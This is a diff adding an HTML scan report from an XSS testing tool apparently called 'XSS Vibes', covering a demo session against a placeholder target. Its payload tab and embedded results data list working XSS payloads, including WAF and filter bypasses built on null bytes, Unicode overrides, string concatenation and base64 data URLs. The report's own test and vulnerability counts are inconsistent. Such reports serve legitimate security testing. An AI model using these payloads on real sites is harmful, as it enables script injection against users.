@@ -1,0 +1,927 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Vibes - Comprehensive Security Report</title>
+    <style>
+:root {
+    --primary-color: #2c3e50;
+    --secondary-color: #3498db;
+    --success-color: #27ae60;
+    --danger-color: #e74c3c;
+    --warning-color: #f39c12;
+    --info-color: #17a2b8;
+    --dark-color: #343a40;
+    --light-color: #f8f9fa;
+    --border-color: #dee2e6;
+}
+
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    line-height: 1.6;
+    color: var(--dark-color);
+    background-color: var(--light-color);
+}
+
+.container {
+    max-width: 1400px;
+    margin: 0 auto;
+    padding: 20px;
+}
+
+.header {
+    background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+    color: white;
+    padding: 30px;
+    border-radius: 12px;
+    margin-bottom: 30px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+}
+
+.logo h1 {
+    font-size: 2.5em;
+    margin-bottom: 5px;
+}
+
+.subtitle {
+    font-size: 1.2em;
+    opacity: 0.9;
+}
+
+.report-info {
+    text-align: right;
+}
+
+.timestamp, .report-type {
+    display: block;
+    margin-bottom: 5px;
+}
+
+.nav-tabs {
+    display: flex;
+    background: white;
+    border-radius: 12px;
+    box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    margin-bottom: 30px;
+    overflow: hidden;
+}
+
+.tab-button {
+    flex: 1;
+    padding: 15px 20px;
+    border: none;
+    background: white;
+    cursor: pointer;
+    font-size: 1em;
+    transition: all 0.3s ease;
+    border-right: 1px solid var(--border-color);
+}
+
+.tab-button:last-child {
+    border-right: none;
+}
+
+.tab-button:hover {
+    background-color: var(--light-color);
+}
+
+.tab-button.active {
+    background-color: var(--secondary-color);
+    color: white;
+}
+
+.tab-content {
+    display: none;
+    animation: fadeIn 0.3s ease;
+}
+
+.tab-content.active {
+    display: block;
+}
+
+@keyframes fadeIn {
+    from { opacity: 0; transform: translateY(10px); }
+    to { opacity: 1; transform: translateY(0); }
+}
+
+.stats-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+    gap: 20px;
+    margin-bottom: 30px;
+}
+
+.stat-card {
+    background: white;
+    padding: 25px;
+    border-radius: 12px;
+    box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    text-align: center;
+    border-left: 4px solid var(--secondary-color);
+}
+
+.stat-number {
+    font-size: 2.5em;
+    font-weight: bold;
+    color: var(--primary-color);
+    margin-bottom: 10px;
+}
+
+.stat-label {
+    font-size: 1.1em;
+    color: #666;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+}
+
+.chart-container {
+    background: white;
+    padding: 25px;
+    border-radius: 12px;
+    box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    margin-bottom: 30px;
+}
+
+.chart-title {
+    font-size: 1.3em;
+    margin-bottom: 20px;
+    color: var(--primary-color);
+    text-align: center;
+}
+
+.results-table {
+    background: white;
+    border-radius: 12px;
+    box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    overflow: hidden;
+}
+
+.severity-critical { color: var(--danger-color); font-weight: bold; }
+.severity-high { color: #ff6b35; font-weight: bold; }
+.severity-medium { color: var(--warning-color); font-weight: bold; }
+.severity-low { color: var(--info-color); }
+.severity-info { color: var(--success-color); }
+
+.status-vulnerable { 
+    background-color: var(--danger-color);
+    color: white;
+    padding: 4px 8px;
+    border-radius: 4px;
+    font-size: 0.9em;
+}
+
+.status-safe {
+    background-color: var(--success-color);
+    color: white;
+    padding: 4px 8px;
+    border-radius: 4px;
+    font-size: 0.9em;
+}
+
+.status-blocked {
+    background-color: var(--warning-color);
+    color: white;
+    padding: 4px 8px;
+    border-radius: 4px;
+    font-size: 0.9em;
+}
+
+.template-section {
+    background: white;
+    padding: 25px;
+    border-radius: 12px;
+    box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    margin-bottom: 20px;
+}
+
+.template-header {
+    display: flex;
+    justify-content: between;
+    align-items: center;
+    margin-bottom: 20px;
+    padding-bottom: 15px;
+    border-bottom: 2px solid var(--border-color);
+}
+
+.template-name {
+    font-size: 1.4em;
+    font-weight: bold;
+    color: var(--primary-color);
+}
+
+.template-stats {
+    font-size: 0.9em;
+    color: #666;
+}
+
+.payload-list {
+    max-height: 300px;
+    overflow-y: auto;
+    border: 1px solid var(--border-color);
+    border-radius: 8px;
+    padding: 15px;
+}
+
+.payload-item {
+    background: var(--light-color);
+    padding: 10px;
+    margin-bottom: 10px;
+    border-radius: 6px;
+    font-family: 'Courier New', monospace;
+    border-left: 3px solid var(--secondary-color);
+}
+
+.export-section {
+    background: white;
+    padding: 25px;
+    border-radius: 12px;
+    box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+}
+
+.export-buttons {
+    display: flex;
+    gap: 15px;
+    flex-wrap: wrap;
+    margin-top: 20px;
+}
+
+.export-btn {
+    padding: 12px 24px;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    font-size: 1em;
+    transition: all 0.3s ease;
+    text-decoration: none;
+    display: inline-block;
+}
+
+.export-btn.primary {
+    background-color: var(--secondary-color);
+    color: white;
+}
+
+.export-btn.success {
+    background-color: var(--success-color);
+    color: white;
+}
+
+.export-btn.warning {
+    background-color: var(--warning-color);
+    color: white;
+}
+
+.export-btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+}
+
+.footer {
+    background: var(--primary-color);
+    color: white;
+    text-align: center;
+    padding: 20px;
+    border-radius: 12px;
+    margin-top: 30px;
+}
+
+.progress-bar {
+    width: 100%;
+    height: 8px;
+    background-color: var(--border-color);
+    border-radius: 4px;
+    overflow: hidden;
+    margin: 10px 0;
+}
+
+.progress-fill {
+    height: 100%;
+    background: linear-gradient(90deg, var(--success-color), var(--secondary-color));
+    transition: width 0.3s ease;
+}
+
+.alert {
+    padding: 15px;
+    margin-bottom: 20px;
+    border-radius: 8px;
+    border-left: 4px solid;
+}
+
+.alert-danger {
+    background-color: #f8d7da;
+    border-color: var(--danger-color);
+    color: #721c24;
+}
+
+.alert-warning {
+    background-color: #fff3cd;
+    border-color: var(--warning-color);
+    color: #856404;
+}
+
+.alert-success {
+    background-color: #d4edda;
+    border-color: var(--success-color);
+    color: #155724;
+}
+
+.alert-info {
+    background-color: #cce7ff;
+    border-color: var(--info-color);
+    color: #0c5460;
+}
+
+@media (max-width: 768px) {
+    .header {
+        flex-direction: column;
+        text-align: center;
+    }
+    
+    .nav-tabs {
+        flex-direction: column;
+    }
+    
+    .stats-grid {
+        grid-template-columns: 1fr;
+    }
+    
+    .export-buttons {
+        flex-direction: column;
+    }
+}
+</style>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <script src="https://unpkg.com/tabulator-tables@5.4.4/dist/js/tabulator.min.js"></script>
+    <link href="https://unpkg.com/tabulator-tables@5.4.4/dist/css/tabulator.min.css" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <div class="logo">
+                <h1>🎯 XSS Vibes</h1>
+                <span class="subtitle">Complete XSS Testing Analysis</span>
+            </div>
+            <div class="report-info">
+                <span class="timestamp">Generated: 2025-07-29 19:03:17</span>
+                <span class="report-type">Comprehensive Report</span>
+            </div>
+        </header>
+        
+        <nav class="nav-tabs">
+            <button class="tab-button active" onclick="showTab('overview')">📊 Overview</button>
+            <button class="tab-button" onclick="showTab('results')">🔍 Results</button>
+            <button class="tab-button" onclick="showTab('templates')">🎯 Templates</button>
+            <button class="tab-button" onclick="showTab('payloads')">💥 Payloads</button>
+            <button class="tab-button" onclick="showTab('statistics')">📈 Statistics</button>
+            <button class="tab-button" onclick="showTab('export')">📤 Export</button>
+        </nav>
+        
+        <main class="main-content">
+            
+        <div id="overview" class="tab-content active">
+            
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-number">9</div>
+                <div class="stat-label">Total Tests</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">7</div>
+                <div class="stat-label">Vulnerabilities</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">2</div>
+                <div class="stat-label">WAF Blocked</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">77.8%</div>
+                <div class="stat-label">Success Rate</div>
+            </div>
+        </div>
+        
+        <div class="alert alert-info">
+            <h3>📊 Scan Summary</h3>
+            <p><strong>Session ID:</strong> ai-tools-demo-002</p>
+            <p><strong>Duration:</strong> 1500.00 seconds</p>
+            <p><strong>Targets:</strong> 1 URLs tested</p>
+            <p><strong>Templates:</strong> 3 different templates used</p>
+        </div>
+        
+        
+            <div class="alert alert-danger">
+                <h3>🚨 Critical Vulnerabilities Found</h3>
+                <p>3 high-severity XSS vulnerabilities detected with script execution capability.</p>
+                <p><strong>Immediate action required!</strong></p>
+            </div>
+            
+            <div class="alert alert-warning">
+                <h3>⚠️ Additional Vulnerabilities</h3>
+                <p>4 additional XSS vulnerabilities found that require attention.</p>
+            </div>
+            
+        
+        </div>
+        <div id="results" class="tab-content">
+            
+        <div class="results-section">
+            <div class="results-controls">
+                <input type="text" id="searchInput" placeholder="Search results..." onkeyup="searchResults()" style="padding: 10px; margin-right: 10px; border: 1px solid #ddd; border-radius: 4px;">
+                <select onchange="filterByStatus(this.value)" style="padding: 10px; border: 1px solid #ddd; border-radius: 4px;">
+                    <option value="all">All Results</option>
+                    <option value="vulnerable">Vulnerabilities Only</option>
+                    <option value="safe">Safe Only</option>
+                    <option value="blocked">WAF Blocked</option>
+                </select>
+            </div>
+            <div id="resultsTable" class="results-table"></div>
+        </div>
+        
+        </div>
+        <div id="templates" class="tab-content">
+            
+            <div class="template-section">
+                <div class="template-header">
+                    <div class="template-name">🎯 dom_sinks</div>
+                    <div class="template-stats">
+                        1/2 successful (50.0%)
+                    </div>
+                </div>
+                <div class="progress-bar">
+                    <div class="progress-fill" data-percentage="50.0"></div>
+                </div>
+                <p><strong>Unique Payloads:</strong> 2</p>
+                <p><strong>Effectiveness:</strong> 
+                    Medium
+                </p>
+            </div>
+            
+            <div class="template-section">
+                <div class="template-header">
+                    <div class="template-name">🎯 react_binding</div>
+                    <div class="template-stats">
+                        5/6 successful (83.3%)
+                    </div>
+                </div>
+                <div class="progress-bar">
+                    <div class="progress-fill" data-percentage="83.33333333333334"></div>
+                </div>
+                <p><strong>Unique Payloads:</strong> 6</p>
+                <p><strong>Effectiveness:</strong> 
+                    High
+                </p>
+            </div>
+            
+            <div class="template-section">
+                <div class="template-header">
+                    <div class="template-name">🎯 web_components</div>
+                    <div class="template-stats">
+                        1/1 successful (100.0%)
+                    </div>
+                </div>
+                <div class="progress-bar">
+                    <div class="progress-fill" data-percentage="100.0"></div>
+                </div>
+                <p><strong>Unique Payloads:</strong> 1</p>
+                <p><strong>Effectiveness:</strong> 
+                    High
+                </p>
+            </div>
+            
+        </div>
+        <div id="payloads" class="tab-content">
+            
+        <div class="payload-section">
+            <h2>🏆 Most Effective Payloads (7 successful)</h2>
+            <div class="payload-list">
+        
+                <div class="payload-item">
+                    <code>"><script>alert('XSS_VIA_EVAL')</script></code>
+                    <div style="margin-top: 8px; font-size: 0.9em; color: #666;">
+                        Success: 1/1 (100.0%) | 
+                        Templates: 1
+                    </div>
+                </div>
+                
+                <div class="payload-item">
+                    <code>"><scr\u0000ipt>window["ale"+"rt"]('WAF_BYPASS')</scr\u0000ipt></code>
+                    <div style="margin-top: 8px; font-size: 0.9em; color: #666;">
+                        Success: 1/1 (100.0%) | 
+                        Templates: 1
+                    </div>
+                </div>
+                
+                <div class="payload-item">
+                    <code>\u202e<script>alert('UNICODE_BYPASS')</script>\u202d</code>
+                    <div style="margin-top: 8px; font-size: 0.9em; color: #666;">
+                        Success: 1/1 (100.0%) | 
+                        Templates: 1
+                    </div>
+                </div>
+                
+                <div class="payload-item">
+                    <code>eval('alert(\"FUNCTION_INJECTION\")')</code>
+                    <div style="margin-top: 8px; font-size: 0.9em; color: #666;">
+                        Success: 1/1 (100.0%) | 
+                        Templates: 1
+                    </div>
+                </div>
+                
+                <div class="payload-item">
+                    <code><img src=x onerror=alert('SHADOW_DOM_XSS')></code>
+                    <div style="margin-top: 8px; font-size: 0.9em; color: #666;">
+                        Success: 1/1 (100.0%) | 
+                        Templates: 1
+                    </div>
+                </div>
+                
+                <div class="payload-item">
+                    <code>javascript:setTimeout(alert,0,'USEEFFECT_XSS')</code>
+                    <div style="margin-top: 8px; font-size: 0.9em; color: #666;">
+                        Success: 1/1 (100.0%) | 
+                        Templates: 1
+                    </div>
+                </div>
+                
+                <div class="payload-item">
+                    <code>data:text/html;base64,PHNjcmlwdD5hbGVydCgnQkFTRTY0X0JZUEFTUycpPC9zY3JpcHQ+</code>
+                    <div style="margin-top: 8px; font-size: 0.9em; color: #666;">
+                        Success: 1/1 (100.0%) | 
+                        Templates: 1
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+            <div class="payload-section">
+                <h2>❌ Ineffective Payloads (2 failed)</h2>
+                <p>These payloads did not result in successful XSS execution across all tests.</p>
+            </div>
+            
+        </div>
+        <div id="statistics" class="tab-content">
+            
+        <div class="chart-container">
+            <div class="chart-title">📊 Vulnerability Distribution</div>
+            <canvas id="vulnChart" width="400" height="200"></canvas>
+        </div>
+        
+        <div class="chart-container">
+            <div class="chart-title">🎯 Template Success Rates</div>
+            <canvas id="templateChart" width="400" height="200"></canvas>
+        </div>
+        
+        <div class="chart-container">
+            <div class="chart-title">📈 Vulnerabilities Timeline</div>
+            <canvas id="timelineChart" width="400" height="200"></canvas>
+        </div>
+        
+        </div>
+        <div id="export" class="tab-content">
+            
+        <div class="export-section">
+            <h2>📤 Export Results</h2>
+            <p>Download scan results in various formats for further analysis or reporting.</p>
+            
+            <div class="export-buttons">
+                <button class="export-btn primary" onclick="exportData('json')">
+                    📄 Export JSON
+                </button>
+                <button class="export-btn success" onclick="exportData('csv')">
+                    📊 Export CSV
+                </button>
+                <button class="export-btn warning" onclick="exportData('xml')">
+                    📋 Export XML
+                </button>
+                <a href="#" class="export-btn" onclick="window.print(); return false;">
+                    🖨️ Print Report
+                </a>
+            </div>
+            
+            <div style="margin-top: 30px;">
+                <h3>📁 Report Details</h3>
+                <ul>
+                    <li><strong>Session ID:</strong> ai-tools-demo-002</li>
+                    <li><strong>Generated:</strong> 2025-07-29 19:03:17</li>
+                    <li><strong>Total Tests:</strong> 25</li>
+                    <li><strong>Format Version:</strong> 2.0</li>
+                </ul>
+            </div>
+        </div>
+        
+        </div>
+        
+        </main>
+        
+        <footer class="footer">
+            <p>Generated by XSS Vibes Advanced Report Generator</p>
+            <p>Session ID: ai-tools-demo-002 | Total Tests: 25</p>
+        </footer>
+    </div>
+    
+    <script>
+function showTab(tabName) {
+    // Hide all tabs
+    const tabs = document.querySelectorAll('.tab-content');
+    tabs.forEach(tab => {
+        tab.classList.remove('active');
+    });
+    
+    // Remove active class from all buttons
+    const buttons = document.querySelectorAll('.tab-button');
+    buttons.forEach(button => {
+        button.classList.remove('active');
+    });
+    
+    // Show selected tab
+    const selectedTab = document.getElementById(tabName);
+    if (selectedTab) {
+        selectedTab.classList.add('active');
+    }
+    
+    // Add active class to clicked button
+    const activeButton = document.querySelector(`[onclick="showTab('${tabName}')"]`);
+    if (activeButton) {
+        activeButton.classList.add('active');
+    }
+    
+    // Initialize charts if statistics tab is shown
+    if (tabName === 'statistics') {
+        setTimeout(initializeCharts, 100);
+    }
+}
+
+function initializeCharts() {
+    // Vulnerability Distribution Chart
+    const vulnCtx = document.getElementById('vulnChart');
+    if (vulnCtx && vulnData) {
+        new Chart(vulnCtx, {
+            type: 'doughnut',
+            data: vulnData,
+            options: {
+                responsive: true,
+                plugins: {
+                    legend: {
+                        position: 'bottom',
+                    },
+                    title: {
+                        display: true,
+                        text: 'Vulnerability Distribution'
+                    }
+                }
+            }
+        });
+    }
+    
+    // Template Success Rate Chart
+    const templateCtx = document.getElementById('templateChart');
+    if (templateCtx && templateData) {
+        new Chart(templateCtx, {
+            type: 'bar',
+            data: templateData,
+            options: {
+                responsive: true,
+                plugins: {
+                    legend: {
+                        display: false,
+                    },
+                    title: {
+                        display: true,
+                        text: 'Template Success Rates'
+                    }
+                },
+                scales: {
+                    y: {
+                        beginAtZero: true,
+                        max: 100,
+                        ticks: {
+                            callback: function(value) {
+                                return value + '%';
+                            }
+                        }
+                    }
+                }
+            }
+        });
+    }
+    
+    // Timeline Chart
+    const timelineCtx = document.getElementById('timelineChart');
+    if (timelineCtx && timelineData) {
+        new Chart(timelineCtx, {
+            type: 'line',
+            data: timelineData,
+            options: {
+                responsive: true,
+                plugins: {
+                    title: {
+                        display: true,
+                        text: 'Vulnerabilities Found Over Time'
+                    }
+                },
+                scales: {
+                    x: {
+                        type: 'time',
+                        time: {
+                            unit: 'minute'
+                        }
+                    },
+                    y: {
+                        beginAtZero: true
+                    }
+                }
+            }
+        });
+    }
+}
+
+function exportData(format) {
+    const data = {
+        session: sessionData,
+        results: resultsData,
+        timestamp: new Date().toISOString()
+    };
+    
+    let content = '';
+    let filename = '';
+    let mimeType = '';
+    
+    switch(format) {
+        case 'json':
+            content = JSON.stringify(data, null, 2);
+            filename = `xss_vibes_report_${data.session.session_id}.json`;
+            mimeType = 'application/json';
+            break;
+            
+        case 'csv':
+            content = convertToCSV(data.results);
+            filename = `xss_vibes_report_${data.session.session_id}.csv`;
+            mimeType = 'text/csv';
+            break;
+            
+        case 'xml':
+            content = convertToXML(data);
+            filename = `xss_vibes_report_${data.session.session_id}.xml`;
+            mimeType = 'application/xml';
+            break;
+    }
+    
+    downloadFile(content, filename, mimeType);
+}
+
+function convertToCSV(results) {
+    const headers = ['Timestamp', 'URL', 'Template', 'Payload', 'Status', 'Vulnerable', 'WAF Blocked', 'Response Time'];
+    const rows = results.map(result => [
+        result.timestamp,
+        result.url,
+        result.template,
+        `"${result.payload.replace(/"/g, '""')}"`,
+        result.status_code,
+        result.executed ? 'Yes' : 'No',
+        result.waf_blocked ? 'Yes' : 'No',
+        result.response_time
+    ]);
+    
+    return [headers, ...rows].map(row => row.join(',')).join('\n');
+}
+
+function convertToXML(data) {
+    return `<?xml version="1.0" encoding="UTF-8"?>
+<xss_vibes_report>
+    <session id="${data.session.session_id}" start_time="${data.session.start_time}">
+        <total_tests>${data.session.total_tests}</total_tests>
+        <vulnerabilities_found>${data.session.vulnerabilities_found}</vulnerabilities_found>
+    </session>
+    <results>
+        ${data.results.map(result => `
+        <result>
+            <timestamp>${result.timestamp}</timestamp>
+            <url><![CDATA[${result.url}]]></url>
+            <template>${result.template}</template>
+            <payload><![CDATA[${result.payload}]]></payload>
+            <vulnerable>${result.executed}</vulnerable>
+            <waf_blocked>${result.waf_blocked}</waf_blocked>
+            <response_time>${result.response_time}</response_time>
+        </result>`).join('')}
+    </results>
+</xss_vibes_report>`;
+}
+
+function downloadFile(content, filename, mimeType) {
+    const blob = new Blob([content], { type: mimeType });
+    const url = URL.createObjectURL(blob);
+    const link = document.createElement('a');
+    link.href = url;
+    link.download = filename;
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+    URL.revokeObjectURL(url);
+}
+
+function searchResults() {
+    const searchTerm = document.getElementById('searchInput').value.toLowerCase();
+    const table = document.getElementById('resultsTable');
+    
+    if (table && table.searchData) {
+        table.setFilter([
+            {field: "payload", type: "like", value: searchTerm},
+            {field: "url", type: "like", value: searchTerm},
+            {field: "template", type: "like", value: searchTerm}
+        ], "or");
+    }
+}
+
+function filterByStatus(status) {
+    const table = document.getElementById('resultsTable');
+    
+    if (table && table.setFilter) {
+        if (status === 'all') {
+            table.clearFilter();
+        } else {
+            table.setFilter("executed", "=", status === 'vulnerable');
+        }
+    }
+}
+
+// Initialize tabulator table when DOM is loaded
+document.addEventListener('DOMContentLoaded', function() {
+    if (typeof resultsData !== 'undefined' && resultsData.length > 0) {
+        const table = new Tabulator("#resultsTable", {
+            data: resultsData,
+            pagination: "local",
+            paginationSize: 25,
+            layout: "fitColumns",
+            responsiveLayout: "hide",
+            columns: [
+                {title: "Time", field: "timestamp", formatter: function(cell) {
+                    return new Date(cell.getValue()).toLocaleTimeString();
+                }, width: 100},
+                {title: "URL", field: "url", formatter: function(cell) {
+                    const url = cell.getValue();
+                    return url.length > 50 ? url.substring(0, 50) + "..." : url;
+                }},
+                {title: "Template", field: "template", width: 120},
+                {title: "Payload", field: "payload", formatter: function(cell) {
+                    const payload = cell.getValue();
+                    return `<code>${payload.length > 60 ? payload.substring(0, 60) + "..." : payload}</code>`;
+                }},
+                {title: "Status", field: "executed", formatter: function(cell) {
+                    const executed = cell.getValue();
+                    const blocked = cell.getRow().getData().waf_blocked;
+                    if (executed) {
+                        return '<span class="status-vulnerable">Vulnerable</span>';
+                    } else if (blocked) {
+                        return '<span class="status-blocked">WAF Blocked</span>';
+                    } else {
+                        return '<span class="status-safe">Safe</span>';
+                    }
+                }, width: 100},
+                {title: "Response", field: "response_time", formatter: function(cell) {
+                    return cell.getValue().toFixed(2) + "ms";
+                }, width: 100}
+            ]
+        });
+        
+        // Store table reference for search/filter functions
+        document.getElementById('resultsTable').searchData = table;
+    }
+});
+
+// Auto-refresh progress bars
+function updateProgressBars() {
+    const progressBars = document.querySelectorAll('.progress-fill');
+    progressBars.forEach(bar => {
+        const percentage = bar.getAttribute('data-percentage');
+        bar.style.width = percentage + '%';
+    });
+}
+
+// Initialize everything when page loads
+window.addEventListener('load', function() {
+    updateProgressBars();
+    showTab('overview');
+});
+
+        
+        // Chart data
+        const vulnData = {"labels": ["Vulnerable", "WAF Blocked", "Safe"], "datasets": [{"data": [7, 2, 0], "backgroundColor": ["#e74c3c", "#f39c12", "#27ae60"], "borderWidth": 2, "borderColor": "#fff"}]};
+        const templateData = {"labels": ["react_binding", "web_components", "dom_sinks"], "datasets": [{"label": "Success Rate (%)", "data": [83.33333333333334, 100.0, 50.0], "backgroundColor": "#3498db", "borderColor": "#2980b9", "borderWidth": 1}]};
+        const timelineData = {"labels": ["Start", "25%", "50%", "75%", "End"], "datasets": [{"label": "Vulnerabilities Found", "data": [0, 1, 3, 5, 7], "borderColor": "#e74c3c", "backgroundColor": "rgba(231, 76, 60, 0.1)", "tension": 0.4}]};
+        
+        // Results data for table and export
+        const resultsData = [{"payload": "\"><script>alert('XSS_VIA_EVAL')</script>", "template": "react_binding", "url": "https://vulnerable-app.demo/component", "method": "POST", "parameter": "userInput", "status_code": 200, "response_time": 0.8, "content_length": 2048, "reflected": true, "executed": true, "waf_blocked": false, "error_message": null, "evidence": "JavaScript alert executed in useEffect eval context", "response_headers": null, "timestamp": "2025-01-29T16:05:00Z"}, {"payload": "\"><scr\\u0000ipt>window[\"ale\"+\"rt\"]('WAF_BYPASS')</scr\\u0000ipt>", "template": "react_binding", "url": "https://vulnerable-app.demo/component", "method": "POST", "parameter": "userCode", "status_code": 200, "response_time": 1.1, "content_length": 2048, "reflected": true, "executed": true, "waf_blocked": false, "error_message": null, "evidence": "WAF bypass successful - null byte + string concatenation", "response_headers": null, "timestamp": "2025-01-29T16:06:00Z"}, {"payload": "\\u202e<script>alert('UNICODE_BYPASS')</script>\\u202d", "template": "react_binding", "url": "https://vulnerable-app.demo/component", "method": "POST", "parameter": "dangerousContent", "status_code": 200, "response_time": 0.9, "content_length": 2048, "reflected": true, "executed": true, "waf_blocked": false, "error_message": null, "evidence": "Unicode override bypass in dangerouslySetInnerHTML", "response_headers": null, "timestamp": "2025-01-29T16:07:00Z"}, {"payload": "eval('alert(\\\"FUNCTION_INJECTION\\\")')", "template": "react_binding", "url": "https://vulnerable-app.demo/component", "method": "POST", "parameter": "funcCode", "status_code": 200, "response_time": 0.7, "content_length": 2048, "reflected": true, "executed": true, "waf_blocked": false, "error_message": null, "evidence": "Code injection via Function constructor", "response_headers": null, "timestamp": "2025-01-29T16:08:00Z"}, {"payload": "<img src=x onerror=alert('SHADOW_DOM_XSS')>", "template": "web_components", "url": "https://vulnerable-app.demo/component", "method": "POST", "parameter": "userInput", "status_code": 200, "response_time": 1.0, "content_length": 2048, "reflected": true, "executed": true, "waf_blocked": false, "error_message": null, "evidence": "Shadow DOM injection bypass successful", "response_headers": null, "timestamp": "2025-01-29T16:09:00Z"}, {"payload": "javascript:setTimeout(alert,0,'USEEFFECT_XSS')", "template": "react_binding", "url": "https://vulnerable-app.demo/component", "method": "POST", "parameter": "userInput", "status_code": 200, "response_time": 0.6, "content_length": 2048, "reflected": true, "executed": true, "waf_blocked": false, "error_message": null, "evidence": "Alternative execution in React useEffect hook", "response_headers": null, "timestamp": "2025-01-29T16:10:00Z"}, {"payload": "data:text/html;base64,PHNjcmlwdD5hbGVydCgnQkFTRTY0X0JZUEFTUycpPC9zY3JpcHQ+", "template": "dom_sinks", "url": "https://vulnerable-app.demo/component", "method": "POST", "parameter": "userInput", "status_code": 200, "response_time": 1.2, "content_length": 2048, "reflected": true, "executed": true, "waf_blocked": false, "error_message": null, "evidence": "Base64 data URL bypass in innerHTML sink", "response_headers": null, "timestamp": "2025-01-29T16:11:00Z"}, {"payload": "<svg/onload=Function('ale'+'rt')('SVG_CONCAT')>", "template": "dom_sinks", "url": "https://vulnerable-app.demo/component", "method": "POST", "parameter": "userCode", "status_code": 200, "response_time": 0.8, "content_length": 2048, "reflected": true, "executed": false, "waf_blocked": true, "error_message": null, "evidence": "Payload reflected but execution blocked by CSP", "response_headers": null, "timestamp": "2025-01-29T16:12:00Z"}, {"payload": "<script>alert('FILTERED')</script>", "template": "react_binding", "url": "https://vulnerable-app.demo/component", "method": "POST", "parameter": "userInput", "status_code": 200, "response_time": 0.5, "content_length": 1024, "reflected": false, "executed": false, "waf_blocked": true, "error_message": null, "evidence": "Basic payload filtered by input validation", "response_headers": null, "timestamp": "2025-01-29T16:13:00Z"}];
+        const sessionData = {"session_id": "ai-tools-demo-002", "start_time": "2025-01-29T16:00:00Z", "end_time": "2025-01-29T16:25:00Z", "target_urls": ["https://vulnerable-app.demo/component"], "total_tests": 25, "successful_tests": 18, "failed_tests": 7, "vulnerabilities_found": 6, "templates_used": ["react_binding", "dom_sinks", "web_components"], "payload_categories": ["eval_injection", "react_hooks", "shadow_dom", "waf_bypass", "unicode_bypass"], "scan_duration": 1500.0};
+        </script>
+</body>
+</html>
